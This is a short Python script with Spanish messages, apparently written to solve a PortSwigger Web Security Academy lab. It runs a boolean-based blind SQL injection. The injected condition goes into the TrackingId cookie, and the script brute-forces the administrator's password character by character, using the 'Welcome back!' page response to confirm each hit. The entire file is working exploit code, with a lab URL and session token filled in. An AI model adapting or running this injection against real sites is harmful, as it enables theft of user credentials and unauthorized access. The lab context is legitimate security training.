#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a8e00f5049e3d15802e5d13003c004f.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():

	password = ""

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Password")

	for position in range(1, 21):	#Esto hace que pruebe hasta 20 caracteres
		for character in characters:

			cookies = {
				'TrackingId': "BvroHPKR23vLwHzo' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
				'session': 'QPWCx6VEaIuh5N4noRLLTg5sziXnpfQ5'
			}

			p1.status(cookies['TrackingId'])

			r = requests.get(main_url, cookies=cookies)

			if "Welcome back!" in r.text:
				password += character
				p2.status(password)
				break

if __name__ == '__main__':

	makeRequest()
